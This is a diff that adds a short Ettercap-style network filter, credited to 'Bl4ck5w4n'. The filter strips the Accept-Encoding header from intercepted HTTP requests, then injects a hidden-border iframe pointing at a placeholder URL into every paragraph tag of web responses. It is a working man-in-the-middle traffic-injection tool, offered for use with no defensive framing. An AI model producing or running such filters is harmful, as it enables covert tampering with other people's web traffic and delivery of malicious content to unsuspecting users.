@@ -1,0 +1,17 @@
+# Author: Bl4ck5w4n ||
+# Description: This filter allows you to create a iframe inside webpage (defaul size 450x315)  ||
+# Type: Single ||
+
+
+if (ip.proto == TCP && tcp.dst == 80) {
+   if (search(DATA.data, "Accept-Encoding")) {
+      replace("Accept-Encoding", "Accept-Rubbish!"); 
+	  msg("zapped Accept-Encoding!\n");
+   }
+}
+
+if (ip.proto == TCP && tcp.src == 80) {
+	replace("<P", "<P align=\"center\"> <iframe src=\"REPLACE_ME\" width=\"450\" height=\"315\" frameBorder=\"0\"></iframe>");
+	replace("<p", "<p align=\"center\"> <iframe src=\"REPLACE_ME\" width=\"450\" height=\"315\" frameBorder=\"0\"></iframe>");
+	msg("redirect success\n");
+} 
